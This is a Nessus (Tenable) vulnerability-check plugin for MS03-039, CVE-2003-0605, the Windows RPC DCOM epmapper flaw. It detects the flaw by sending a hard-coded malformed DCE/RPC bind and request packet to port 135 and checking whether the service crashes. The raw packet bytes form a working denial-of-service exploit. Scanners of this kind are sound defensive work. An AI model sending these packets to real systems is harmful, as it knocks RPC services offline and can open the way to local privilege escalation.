#
# (C) Tenable Network Security, Inc.
#

# Original exploit from xfocus.org
# Workaround by Michael Scheidell from SECNAP Network Security


include("compat.inc");


if(description)
{
 script_id(11798);
 script_version ("$Revision: 1.24 $");

 script_cve_id("CVE-2003-0605");
 script_bugtraq_id(8234, 8460);
 script_xref(name:"IAVA", value:"2003-A-0012");
 script_xref(name:"OSVDB", value:"11460");
 
 script_name(english:"MS03-039: Microsoft Windows RPC DCOM Interface epmapper Pipe Hijack Local Privilege Escalation (824146)");
 script_summary(english:"Remotely close port 135");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The remote Windows host has a denial of service vulnerability that\n",
     "may lead to privilege escalation."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "It is possible to disable the remote RPC DOM interface by sending it\n",
     "a malformed request.  The system will need to be rebooted to recover.\n",
     "A remote attacker could exploit this flaw to remotely disable RPC-\n",
     "related programs on this host.\n\n",
     "If a denial of service attack is successful, a local attacker could\n",
     "escalate privileges by hijacking the epmapper pipe."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2003-07/0255.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"See http://www.microsoft.com/technet/security/bulletin/ms03-039.mspx"
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C"
 );
 script_end_attributes();

 script_category(ACT_KILL_HOST); # Crashes everything com-related
 script_family(english:"Windows : Microsoft Bulletins");

 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_require_ports(135);
 script_require_keys("Settings/ParanoidReport");

 exit(0);
}


include("global_settings.inc");

if (report_paranoia < 2) exit(0);

if(!get_port_state(135))exit(0);

bindstr = raw_string(0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0xA0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00);
request = raw_string(0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x13,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x01,0x00,0x03,0x00,0x05,0x00,0x06,0x01,0x00,0x00,0x00,0x00,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00);


soc = open_sock_tcp(135);
if(!soc)exit(0);
send(socket:soc, data:bindstr);
r = recv(socket:soc, length:60);
send(socket:soc, data:request);
r = recv(socket:soc, length:60);
close(soc);
sleep(1);
soc = open_sock_tcp(135);
if(!soc)security_hole(135);
